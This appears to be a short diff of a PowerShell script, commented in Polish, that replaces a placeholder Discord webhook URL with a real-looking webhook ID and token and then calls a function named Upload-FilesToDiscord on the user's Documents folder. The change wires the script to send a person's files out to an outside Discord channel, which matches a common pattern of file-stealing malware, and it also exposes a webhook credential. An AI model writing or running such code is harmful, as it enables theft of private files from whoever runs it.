@@ -39,7 +39,7 @@ function Upload-FilesToDiscord {
 }
 
 # Przykład użycia
-$webhookUrl = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
+$webhookUrl = "https://discord.com/api/webhooks/1169613960429965382/uSQurwvfaGLDPwSZosk8AdXV3Yfk0kkupkFZPUJvhjf7lS5aww0M6GWxViPns5CFUZON"
 $folderPath = "$env:USERPROFILE\Documents"
 
 Upload-FilesToDiscord -folderPath $folderPath -webhookUrl $webhookUrl
